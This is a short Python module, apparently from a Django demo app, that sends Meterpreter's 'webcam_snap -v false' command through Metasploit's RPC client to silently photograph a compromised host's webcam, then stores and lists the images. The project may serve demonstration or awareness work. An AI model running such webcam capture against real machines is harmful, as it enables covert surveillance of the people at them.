from metasploit.msfrpc import MsfRpcClient

import time
import anssi.settings
import os

def post_take_snapshot(shell, snapshot_path):
    shell.write('webcam_snap -v false -p {}\n'.format(snapshot_path))
    
    # Wait the end of the function (migration or execution of screenshot)
    while not os.path.exists(snapshot_path):
	time.sleep(0.2)
        
    result = shell.read()

    return


def get_snapshot_path(snapshot_id):
    return os.path.join(anssi.settings.MEDIA_ROOT, "snapshots", "snapshot{}.jpeg".format(snapshot_id))


def remove_snapshots():
    snapshots_path = os.path.join(anssi.settings.MEDIA_ROOT, "snapshots")

    for root, dirs, files in os.walk(snapshots_path):
        for name in files:
            full_path = os.path.join(snapshots_path, name)
            os.remove(full_path)


def get_snapshots_url(snapshot_id, snapshot_number):
    images = []
    path = os.path.join(anssi.settings.MEDIA_URL, "snapshots")

    for i in range(snapshot_id, snapshot_number + snapshot_id):
        filename = "snapshot{}.jpeg".format(i % snapshot_number)
        images.append(os.path.join(path, filename))


    images.reverse()
    return images
